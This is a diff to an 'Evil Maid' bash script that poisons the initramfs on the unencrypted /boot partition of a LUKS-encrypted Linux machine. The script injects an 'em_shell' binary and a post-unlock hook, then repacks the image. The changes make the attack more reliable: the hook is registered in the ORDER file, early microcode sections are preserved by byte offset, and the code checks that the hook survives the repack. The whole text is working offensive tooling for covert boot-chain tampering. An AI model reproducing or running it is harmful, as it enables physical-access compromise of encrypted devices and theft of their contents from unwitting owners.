@@ -5,7 +5,7 @@
 # Only /boot (always unencrypted) needs to be accessible — no passphrase required.
 #
 # Run from any Linux live USB (Ubuntu, Kali, Parrot, etc.)
-# Requirements: unmkinitramfs (apt install initramfs-tools), cpio, gzip
+# Requirements: unmkinitramfs (apt install initramfs-tools), cpio, gzip, python3
 
 usage() {
     echo "Usage: $0 -b <boot_partition> [-k <kernel_version>]"
@@ -47,13 +47,21 @@ command -v unmkinitramfs &>/dev/null || {
     exit 1
 }
 
+command -v python3 &>/dev/null || {
+    echo "[!] python3 not found. Run: apt install python3"
+    exit 1
+}
+
 echo "--- Evil Maid: Boot Poison Phase ---"
 echo "[*] Boot partition : $BOOT_PARTITION"
 
 # ── Mount /boot ───────────────────────────────────────────────────────────────
 
 mkdir -p "$BOOT_MOUNT"
-mount "$BOOT_PARTITION" "$BOOT_MOUNT" || { echo "[!] Failed to mount $BOOT_PARTITION."; exit 1; }
+mountpoint -q "$BOOT_MOUNT" || mount "$BOOT_PARTITION" "$BOOT_MOUNT" || {
+    echo "[!] Failed to mount $BOOT_PARTITION."
+    exit 1
+}
 echo "[+] Boot partition mounted at $BOOT_MOUNT."
 
 # ── Locate initrd ─────────────────────────────────────────────────────────────
@@ -111,73 +119,98 @@ cp ./em_shell "$MAIN_DIR/bin/em_shell"
 chmod +x "$MAIN_DIR/bin/em_shell"
 
 # local-bottom scripts run after LUKS is unlocked and root is mounted at ${rootmnt}
-cp ./em_inject_hook "$MAIN_DIR/scripts/local-bottom/em_inject"
+mkdir -p "$MAIN_DIR/scripts/local-bottom"
+cp ./em_inject_hook "$MAIN_DIR/scripts/local-bottom/em_inject" || {
+    echo "[!] Failed to copy hook into initramfs."
+    umount "$BOOT_MOUNT"
+    exit 1
+}
 chmod +x "$MAIN_DIR/scripts/local-bottom/em_inject"
+
+# Add hook to ORDER so initramfs actually executes it
+printf '/scripts/local-bottom/em_inject "$@"\n[ -e /conf/param.conf ] && . /conf/param.conf\n' >> "$MAIN_DIR/scripts/local-bottom/ORDER"
+echo "[+] Hook added to local-bottom ORDER."
 
 echo "[+] em_shell binary and hook injected into initramfs."
 
-# ── Detect compression ───────────────────────────────────────────────────────
-# Read from victim's own initramfs-tools config (most reliable source).
-# Falls back to lz4 which is the Ubuntu 22.04 default.
+# ── Verify payload before repacking ──────────────────────────────────────────
 
-COMPRESS="lz4"
-CONF="$MAIN_DIR/etc/initramfs-tools/initramfs.conf"
-if [ -f "$CONF" ]; then
-    DETECTED=$(grep "^COMPRESS=" "$CONF" | cut -d= -f2 | tr -d '[:space:]')
-    [ -n "$DETECTED" ] && COMPRESS="$DETECTED"
+if [ ! -f "$MAIN_DIR/scripts/local-bottom/em_inject" ]; then
+    echo "[!] Hook not found in work dir — aborting."
+    umount "$BOOT_MOUNT"
+    exit 1
 fi
-echo "[+] Compression (from config): $COMPRESS"
-
-# Verify the required compressor is available and functional.
-# lz4 uses -l (legacy frame format) which is what the Linux kernel expects.
-# Fall back to gzip (universally available) if the tool is missing or broken.
-if [ "$COMPRESS" = "lz4" ]; then
-    if ! command -v lz4 &>/dev/null; then
-        echo "[!] lz4 not found — falling back to gzip. Install with: apt install lz4"
-        COMPRESS="gzip"
-    elif ! echo "test" | lz4 -9 -l > /dev/null 2>&1; then
-        echo "[!] lz4 smoke test failed — falling back to gzip."
-        COMPRESS="gzip"
-    else
-        echo "[+] lz4 verified OK."
-    fi
-elif [ "$COMPRESS" = "zstd" ]; then
-    if ! command -v zstd &>/dev/null; then
-        echo "[!] zstd not found — falling back to gzip. Install with: apt install zstd"
-        COMPRESS="gzip"
-    fi
+if [ ! -x "$MAIN_DIR/scripts/local-bottom/em_inject" ]; then
+    echo "[!] Hook not executable in work dir — aborting."
+    umount "$BOOT_MOUNT"
+    exit 1
 fi
-echo "[+] Compressor in use: $COMPRESS"
-
-compress_main() {
-    case "$COMPRESS" in
-        lz4)  lz4 -9 -l ;;
-        zstd) zstd -19 ;;
-        *)    gzip -9 ;;
-    esac
-}
+echo "[+] Hook verified in work dir — proceeding to repack."
 
 # ── Repack initramfs ──────────────────────────────────────────────────────────
-# Multi-section: early/microcode sections must remain uncompressed cpio.
-# Main section uses the same compressor as the original.
+# Strategy: preserve early/microcode sections byte-for-byte using TRAILER!!!
+# offset, then repack main section with gzip (universally accepted by kernel).
 
 > "$NEW_INITRD"
 
 if [ "$MAIN_DIR" = "$WORK_DIR" ]; then
-    # Single-section initramfs (typical in VMs)
-    (cd "$WORK_DIR" && find . | cpio -H newc -o 2>/dev/null | compress_main) >> "$NEW_INITRD"
+    # Single-section initramfs — repack everything with gzip
+    echo "[+] Single-section initramfs detected — repacking with gzip."
+    (cd "$WORK_DIR" && find . | cpio -H newc -o 2>/dev/null | gzip -9) >> "$NEW_INITRD"
 else
-    # Multi-section: iterate in sorted order, preserving section types
-    for dir in $(ls -d "$WORK_DIR"/*/ 2>/dev/null | sort -V); do
-        dir="${dir%/}"
-        if [ "$dir" = "$MAIN_DIR" ]; then
-            (cd "$dir" && find . | cpio -H newc -o 2>/dev/null | compress_main) >> "$NEW_INITRD"
-        else
-            # Early/microcode: always uncompressed cpio (kernel requirement)
-            (cd "$dir" && find . | cpio -H newc -o 2>/dev/null) >> "$NEW_INITRD"
-        fi
-    done
+    # Multi-section: find offset where early sections end and main begins
+    # Look for the last TRAILER!!! followed by a compression magic byte
+    echo "[+] Multi-section initramfs detected — preserving early sections."
+
+    OFFSET=$(python3 -c "
+data = open('$INITRD', 'rb').read()
+# Find all TRAILER!!! occurrences and use the last one before the main section
+idx = 0
+last = 0
+while True:
+    pos = data.find(b'TRAILER!!!', idx)
+    if pos == -1:
+        break
+    last = pos
+    idx = pos + 1
+
+# Advance past TRAILER!!! and padding to find compression magic
+i = last + len(b'TRAILER!!!')
+while i < len(data):
+    # gzip magic
+    if data[i:i+2] == b'\x1f\x8b':
+        break
+    # zstd magic
+    if data[i:i+4] == b'\x28\xb5\x2f\xfd':
+        break
+    # lz4 legacy magic
+    if data[i:i+4] == b'\x02\x21\x4c\x18':
+        break
+    i += 1
+print(i)
+")
+
+    echo "[+] Early section ends at byte offset: $OFFSET"
+
+    # Preserve early sections byte-for-byte
+    dd if="$INITRD" bs=1 count="$OFFSET" of="$NEW_INITRD" 2>/dev/null
+    echo "[+] Early sections preserved."
+
+    # Repack main section with gzip and append
+    (cd "$MAIN_DIR" && find . | cpio -H newc -o 2>/dev/null | gzip -9) >> "$NEW_INITRD"
+    echo "[+] Main section repacked with gzip."
 fi
+
+# ── Verify hook is present in new initramfs ───────────────────────────────────
+
+if ! lsinitramfs "$NEW_INITRD" 2>/dev/null | grep -q "scripts/local-bottom/em_inject"; then
+    echo "[!] Hook NOT found in repacked initramfs — restoring original and aborting."
+    cp "$BAK_DIR/initrd.img-$KERNEL_VER.bak" "$INITRD"
+    rm -rf "$WORK_DIR" "$NEW_INITRD"
+    umount "$BOOT_MOUNT"
+    exit 1
+fi
+echo "[+] Hook confirmed present in repacked initramfs."
 
 # ── Replace initrd and clean up ───────────────────────────────────────────────
 
